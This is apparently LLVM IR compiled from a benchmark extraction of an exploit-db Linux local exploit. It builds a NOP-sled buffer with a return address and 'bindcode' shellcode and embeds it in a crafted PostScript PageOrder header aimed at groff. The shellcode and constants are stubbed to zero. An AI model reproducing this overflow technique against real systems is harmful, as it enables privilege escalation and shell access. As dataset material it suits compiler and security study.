; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21871.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21871.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFSIZ = common dso_local global i32 0, align 4
@NOP = common dso_local global i32 0, align 4
@STDALIGN = common dso_local global i64 0, align 8
@SCBUF = common dso_local global i32 0, align 4
@bindcode = common dso_local global i32 0, align 4
@GARBAGE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [17 x i8] c"%%!PS-Adobe-3.0\0A\00", align 1
@.str.1 = private unnamed_addr constant [73 x i8] c"%%%%Creator: groff 1.16 (with modifications by zen-parse by hand 1.00a)\0A\00", align 1
@.str.2 = private unnamed_addr constant [39 x i8] c"%%%%CreationDate: Sat Jun 15 15:30ish\0A\00", align 1
@.str.3 = private unnamed_addr constant [19 x i8] c"%%%%PageOrder: %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [17 x i8] c"%%%%EndComments\0A\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"%%%%EOF\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* @BUFSIZ, align 4
  %12 = zext i32 %11 to i64
  %13 = call i8* @llvm.stacksave()
  store i8* %13, i8** %8, align 8
  %14 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %9, align 8
  %15 = load i32, i32* %4, align 4
  %16 = icmp ne i32 %15, 3
  br i1 %16, label %17, label %22

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 @usage(i8* %20)
  br label %22

22:                                               ; preds = %17, %2
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @atoi(i8* %25)
  store i32 %26, i32* %6, align 4
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 2
  %29 = load i8*, i8** %28, align 8
  %30 = call i64 @strtoul(i8* %29, i32 0, i32* null)
  store i64 %30, i64* %7, align 8
  store i8* %14, i8** %10, align 8
  %31 = load i8*, i8** %10, align 8
  %32 = load i32, i32* @NOP, align 4
  %33 = load i32, i32* @BUFSIZ, align 4
  %34 = call i32 @memset(i8* %31, i32 %32, i32 %33)
  %35 = load i64, i64* @STDALIGN, align 8
  %36 = load i32, i32* %6, align 4
  %37 = sext i32 %36 to i64
  %38 = add nsw i64 %35, %37
  %39 = load i8*, i8** %10, align 8
  %40 = getelementptr inbounds i8, i8* %39, i64 %38
  store i8* %40, i8** %10, align 8
  %41 = load i64, i64* %7, align 8
  %42 = inttoptr i64 %41 to i8*
  %43 = load i8*, i8** %10, align 8
  %44 = bitcast i8* %43 to i8**
  store i8* %42, i8** %44, align 8
  %45 = load i8*, i8** %10, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 4
  store i8* %46, i8** %10, align 8
  %47 = load i32, i32* @SCBUF, align 4
  %48 = load i32, i32* @bindcode, align 4
  %49 = call i32 @strlen(i32 %48)
  %50 = sub nsw i32 %47, %49
  %51 = sub nsw i32 %50, 1
  %52 = load i8*, i8** %10, align 8
  %53 = sext i32 %51 to i64
  %54 = getelementptr inbounds i8, i8* %52, i64 %53
  store i8* %54, i8** %10, align 8
  %55 = load i8*, i8** %10, align 8
  %56 = load i32, i32* @bindcode, align 4
  %57 = load i32, i32* @bindcode, align 4
  %58 = call i32 @strlen(i32 %57)
  %59 = call i32 @memcpy(i8* %55, i32 %56, i32 %58)
  %60 = load i32, i32* @bindcode, align 4
  %61 = call i32 @strlen(i32 %60)
  %62 = load i8*, i8** %10, align 8
  %63 = sext i32 %61 to i64
  %64 = getelementptr inbounds i8, i8* %62, i64 %63
  store i8* %64, i8** %10, align 8
  %65 = load i32, i32* @GARBAGE, align 4
  %66 = load i8*, i8** %10, align 8
  %67 = sext i32 %65 to i64
  %68 = getelementptr inbounds i8, i8* %66, i64 %67
  store i8* %68, i8** %10, align 8
  %69 = load i8*, i8** %10, align 8
  store i8 0, i8* %69, align 1
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0))
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.1, i64 0, i64 0))
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.2, i64 0, i64 0))
  %73 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0), i8* %14)
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0))
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  %76 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %76)
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @usage(i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i64 @strtoul(i8*, i32, i32*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
